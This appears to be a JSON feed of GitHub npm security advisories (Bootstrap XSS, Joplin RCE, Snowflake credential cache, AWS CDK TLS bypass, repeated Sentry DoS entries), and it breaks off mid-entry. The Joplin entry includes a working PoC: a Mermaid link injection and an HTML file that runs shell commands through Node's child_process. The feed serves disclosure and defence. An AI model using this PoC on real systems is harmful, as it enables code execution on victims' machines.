{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<p>A vulnerability has been identified in Bootstrap that exposes users to Cross-Site Scripting (XSS) attacks. The issue is present in the carousel component, where the <code>data-slide</code> and <code>data-slide-to</code> attributes can be exploited through the href attribute of an <code>&lt;a&gt;</code> tag due to inadequate sanitization. This vulnerability could potentially enable attackers to execute arbitrary JavaScript within the victim's browser.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-6484\">https://nvd.nist.gov/vuln/detail/CVE-2024-6484</a></li>\n<li><a href=\"https://www.herodevs.com/vulnerability-directory/cve-2024-6484\">https://www.herodevs.com/vulnerability-directory/cve-2024-6484</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap-sass/CVE-2024-6484.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap-sass/CVE-2024-6484.yml</a></li>\n<li><a href=\"https://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap/CVE-2024-6484.yml\">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/bootstrap/CVE-2024-6484.yml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9mvj-f7w8-pvh2\">https://github.com/advisories/GHSA-9mvj-f7w8-pvh2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9mvj-f7w8-pvh2",
            "title": "[bootstrap-sass] Bootstrap Cross-Site Scripting (XSS) vulnerability",
            "date_modified": "2025-01-31T16:28:20.000Z",
            "date_published": "2024-07-11T18:31:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9mvj-f7w8-pvh2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There is a vulnerability in <code>Joplin-desktop</code> that leads to remote code execution (RCE) when a user clicks on an <code>&lt;a&gt;</code> link within untrusted notes. The issue arises due to insufficient sanitization of <code>&lt;a&gt;</code> tag attributes introduced by the <code>Mermaid</code>. This vulnerability allows the execution of untrusted HTML content within the Electron window, which has full access to Node.js APIs, enabling arbitrary shell command execution.</p>\n<h3 id=\"details\">Details</h3>\n<p>In the markdown preview iframe, <code>Joplin</code> only opens <code>&lt;a&gt;</code> links internally within the same Electron window if they contain the <code>data-from-md</code> attribute. While Joplin successfully sanitizes the <code>data-from-md</code> attribute in user-embedded <code>&lt;a&gt;</code> links from the <code>.md</code> file to prevent the execution of untrusted HTML content, it fails to sanitize the <code>data-from-md</code> attributes of <code>&lt;a&gt;</code> tags introduced by <code>Mermaid</code> (e.g., the code snippet shown below). Since <code>Mermaid</code> allows the rendering of certain scriptless HTML elements, an attacker can embed <code>&lt;a&gt; </code>tags with <code>data-from-md</code> attributes, which will then be opened internally in the same Electron window.</p>\n<p>Additionally, <code>Joplin</code> opens the window with <code>nodeIntegration</code> set to <code>true</code> and <code>contextIsolation</code> set to <code>false</code>, resulting in any scripts running in the opened window having full access to Node.js APIs. Furthermore, the markdown preview iframe shares the same origin (i.e.,local file system) as its parent and lacks the <code>sandbox</code> attribute, allowing scripts running in the iframe to call Node.js APIs through <code>window.parent</code>. As a result, an attacker can execute arbitrary code using Node.js APIs by exploiting HTML files stored on the local file system, which share the same origin as the parent.</p>\n<p><strong>Relevant code references:</strong></p>\n<ul>\n<li>Payload to inject <code>&lt;a&gt;</code> with <code>data-from-md</code> attribute:</li>\n</ul>\n<pre><code class=\"language-markdown\">```mermaid\nflowchart TD\n    A[&lt;a href=\"https://attacker.com\" data-from-md&gt;hello&lt;/a&gt;]\n```\n</code></pre>\n<ul>\n<li>Handling link navigation in the markdown preview iframe</li>\n</ul>\n<p><a href=\"https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/lib/renderers/webviewLib.js#L93-L116\">https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/lib/renderers/webviewLib.js#L93-L116</a></p>\n<ul>\n<li>Window configuration of <code>Joplin</code> window</li>\n</ul>\n<p><a href=\"https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/app-desktop/ElectronAppWrapper.ts#L141-L155\">https://github.com/laurent22/joplin/blob/e6c09da639adeb76f12e4477cc8442c49c0ced0c/packages/app-desktop/ElectronAppWrapper.ts#L141-L155</a></p>\n<h3 id=\"poc\">PoC</h3>\n<p>Considering the user has downloaded the following shared files from the internet (Note: the threat model aligns with existing published security issues: <a href=\"https://github.com/laurent22/joplin/security/advisories/GHSA-2h88-m32f-qh5m\">GHSA-2h88-m32f-qh5m</a> and <a href=\"https://github.com/laurent22/joplin/security/advisories/GHSA-g8qx-5vcm-3x59\">GHSA-g8qx-5vcm-3x59</a>, where the malicious HTML file is available locally):</p>\n<ul>\n<li><code>poc.md</code></li>\n</ul>\n<pre><code class=\"language-markdown\">```mermaid\nflowchart TD\n    A[&lt;a href=\"/../../../../../../../../../../../../../../../path/to/poc2.html\" data-from-md&gt;hello&lt;/a&gt;]\n```\n</code></pre>\n<ul>\n<li><code>poc2.html</code></li>\n</ul>\n<pre><code>&lt;html&gt;\n  &lt;body&gt;\n    &lt;script&gt;\n      if (typeof window.parent.require !== 'undefined') {\n        const { exec } = window.parent.require('child_process');\n        exec('ls -al', (err, stdout, stderr) =&gt; {\n          if (err) {\n            document.body.innerText = `Error: ${err.message}`;\n            return;\n          }\n          if (stderr) {\n            document.body.innerText = `Stderr: ${stderr}`;\n            return;\n          }\n          document.body.innerText = stdout;\n        });\n      } else {\n        document.body.innerText = 'Require is not available in this environment.';\n      }\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>Then, open the <code>poc.md</code> with <code>Joplin</code> and click on the <code>hello</code> link. The code embedded in the <code>poc2.html</code> will be executed.</p>\n<p><img alt=\"result\" src=\"https://github.com/user-attachments/assets/e85fbad8-a348-49cd-af51-4fc302dd6a8f\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can lead to Remote Code Execution (RCE) when users open and interact with untrusted notes, while malicious HTML files are available locally.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7\">https://github.com/laurent22/joplin/security/advisories/GHSA-hff8-hjwv-j9q7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49362\">https://nvd.nist.gov/vuln/detail/CVE-2024-49362</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hff8-hjwv-j9q7\">https://github.com/advisories/GHSA-hff8-hjwv-j9q7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hff8-hjwv-j9q7",
            "title": "[joplin] Remote Code Execution on click of <a> Link in markdown preview",
            "date_modified": "2025-01-30T18:05:56.000Z",
            "date_published": "2024-11-14T17:38:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hff8-hjwv-j9q7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"issue\">Issue</h3>\n<p>Snowflake discovered and remediated a vulnerability in the Snowflake NodeJS Driver. File permissions checks of the temporary credential cache could be bypassed by an attacker with write access to the local cache directory.</p>\n<p>This vulnerability affects versions 1.12.0 through 2.0.1 on Linux. Snowflake fixed the issue in version 2.0.2.</p>\n<h3 id=\"vulnerability-details\">Vulnerability Details</h3>\n<p>On Linux, when either EXTERNALBROWSER or USERNAME_PASSWORD_MFA authentication methods are used with temporary credential caching enabled, the Snowflake NodeJS Driver will cache temporary credentials in a local file. Due to a bug, the check verifying that the cache file can be accessed only by the user running the Driver always succeeded, but didn’t verify the permissions or the ownership correctly. An attacker with write access to the local cache folder could plant an empty file there and the Driver would use it to store temporary credentials instead of rejecting it due to overly broad permissions.</p>\n<h3 id=\"solution\">Solution</h3>\n<p>Snowflake released version 2.0.2 of the Snowflake NodeJS Driver, which fixes this issue. We recommend users upgrade to version 2.0.2.</p>\n<h3 id=\"additional-information\">Additional Information</h3>\n<p>If you discover a security vulnerability in one of our products or websites, please report the issue to HackerOne. For more information, please see our <a href=\"https://hackerone.com/snowflake?type=team\">Vulnerability Disclosure Policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/snowflakedb/snowflake-connector-nodejs/security/advisories/GHSA-xfhv-wqj6-rx99\">https://github.com/snowflakedb/snowflake-connector-nodejs/security/advisories/GHSA-xfhv-wqj6-rx99</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24791\">https://nvd.nist.gov/vuln/detail/CVE-2025-24791</a></li>\n<li><a href=\"https://github.com/snowflakedb/snowflake-connector-nodejs/commit/89731b3a4d61a75b721d13d4e47a7a3712ffa45f\">https://github.com/snowflakedb/snowflake-connector-nodejs/commit/89731b3a4d61a75b721d13d4e47a7a3712ffa45f</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xfhv-wqj6-rx99\">https://github.com/advisories/GHSA-xfhv-wqj6-rx99</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xfhv-wqj6-rx99",
            "title": "[snowflake-sdk] snowflake-sdk may incorrectly validate temporary credential cache file permissions",
            "date_modified": "2025-01-29T18:42:28.000Z",
            "date_published": "2025-01-29T18:42:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xfhv-wqj6-rx99"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Users who use IAM OIDC custom resource provider package will download CA Thumbprints as part of the custom resource workflow, <a href=\"https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34\">https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34</a>. </p>\n<p>However, the current <code>tls.connect</code> method will always set <code>rejectUnauthorized: false</code> which is a potential security concern. CDK should follow the best practice and set <code>rejectUnauthorized: true</code>. However, this could be a breaking change for existing CDK applications and we should fix this with a feature flag. </p>\n<p>Note that this is marked as low severity Security advisory because the issuer url is provided by CDK users who define the CDK application. If they insist on connecting to a unauthorized OIDC provider, CDK should not disallow this. Additionally, the code block is run in a Lambda environment which mitigate the MITM attack.</p>\n<p>As a best practice, CDK should still fix this issue under a feature flag to avoid regression.</p>\n<pre><code>packages/@aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts\n❯❱ problem-based-packs.insecure-transport.js-node.bypass-tls-verification.bypass-tls-verification\nChecks for setting the environment variable NODE_TLS_REJECT_UNAUTHORIZED to 0, which disables TLS\nverification. This should only be used for debugging purposes. Setting the option rejectUnauthorized\nto false bypasses verification against the list of trusted CAs, which also leads to insecure\ntransport.\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>The patch is in progress. To mitigate, upgrade to CDK v2.177.0 (Expected release date 2025-02-22). \nOnce upgraded, please make sure the feature flag '@aws-cdk/aws-iam:oidcRejectUnauthorizedConnections' is set to true in <code>cdk.context.json</code> or <code>cdk.json</code>. More details on feature flag setting is <a href=\"https://docs.aws.amazon.com/cdk/v2/guide/featureflags.html\">here</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>N/A</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/aws/aws-cdk/issues/32920\">https://github.com/aws/aws-cdk/issues/32920</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aws/aws-cdk/security/advisories/GHSA-v4mq-x674-ff73\">https://github.com/aws/aws-cdk/security/advisories/GHSA-v4mq-x674-ff73</a></li>\n<li><a href=\"https://github.com/aws/aws-cdk/issues/32920\">https://github.com/aws/aws-cdk/issues/32920</a></li>\n<li><a href=\"https://github.com/aws/aws-cdk/commit/3e4f3773bfa48b75bf0adc7d53d46bbec7714a9e#diff-38a03353f201fd2e520df67fb43f9f000257bffd6e9acaa5569cce7005a77560\">https://github.com/aws/aws-cdk/commit/3e4f3773bfa48b75bf0adc7d53d46bbec7714a9e#diff-38a03353f201fd2e520df67fb43f9f000257bffd6e9acaa5569cce7005a77560</a></li>\n<li><a href=\"https://docs.aws.amazon.com/cdk/v2/guide/featureflags.html\">https://docs.aws.amazon.com/cdk/v2/guide/featureflags.html</a></li>\n<li><a href=\"https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34\">https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23206\">https://nvd.nist.gov/vuln/detail/CVE-2025-23206</a></li>\n<li><a href=\"https://github.com/aws/aws-cdk/pull/32921\">https://github.com/aws/aws-cdk/pull/32921</a></li>\n<li><a href=\"https://github.com/aws/aws-cdk/releases/tag/v2.177.0\">https://github.com/aws/aws-cdk/releases/tag/v2.177.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v4mq-x674-ff73\">https://github.com/advisories/GHSA-v4mq-x674-ff73</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v4mq-x674-ff73",
            "title": "[aws-cdk-lib] AWS Cloud Development Kit (AWS CDK) IAM OIDC custom resource allows connection to unauthorized OIDC provider",
            "date_modified": "2025-01-29T18:22:29.000Z",
            "date_published": "2025-01-17T21:22:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v4mq-x674-ff73"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/sveltekit] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T21:26:10.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/solidstart] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T21:26:10.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/remix] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T21:26:10.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/nuxt] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T21:26:10.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version <code>8.49.0</code> and above you can disable the ContextLines integration. See the <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/#removing-a-default-integration\">docs</a> for more details.</p>\n<pre><code class=\"language-js\">Sentry.init({\n  // ...\n  integrations: function (integrations) {\n    // integrations will be all default integrations\n    return integrations.filter(function (integration) {\n      return integration.name !== \"ContextLines\";\n    });\n  },\n});\n</code></pre>\n<p>If you disable the ContextLines integration, you will lose source context on your error events.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Reported issue: <a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li>PR Fix: <a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/getsentry/sentry-javascript/security/advisories/GHSA-r5w7-f542-q2j4</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/issues/14892\">https://github.com/getsentry/sentry-javascript/issues/14892</a></li>\n<li><a href=\"https://github.com/getsentry/sentry-javascript/pull/14997\">https://github.com/getsentry/sentry-javascript/pull/14997</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-r5w7-f542-q2j4\">https://github.com/advisories/GHSA-r5w7-f542-q2j4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4",
            "title": "[@sentry/nextjs] Potential DoS when using ContextLines integration",
            "date_modified": "2025-01-28T21:26:10.000Z",
            "date_published": "2025-01-28T20:37:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-r5w7-f542-q2j4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://docs.sentry.io/platforms/javascript/guides/node/configuration/integrations/contextlines/\">ContextLines integration</a> uses readable streams to more efficiently use memory when reading files. The ContextLines integration is used to attach source context to outgoing events.</p>\n<p>The stream was not explicitly closed after use. This could lead to excessive amounts of file handles open on the system and potentially lead to a Denial of Service (DoS).</p>\n<p>The ContextLines integration is enabled by default in the Node SDK (<code>@sentry/node</code>) and SDKs that run in Node.js environments (<code>@sentry/astro</code>, <code>@sentry/aws-serverless</code>, <code>@sentry/bun</code>, <code>@sentry/google-cloud-serverless</code>, <code>@sentry/nestjs</code>, <code>@sentry/nextjs</code>, <code>@sentry/nuxt</code>, <code>@sentry/remix</code>, <code>@sentry/solidstart</code>, <code>@sentry/sveltekit</code>).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to version <code>8.49.0</code> or higher.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>To remediate this issue in affected versions without upgrading to version 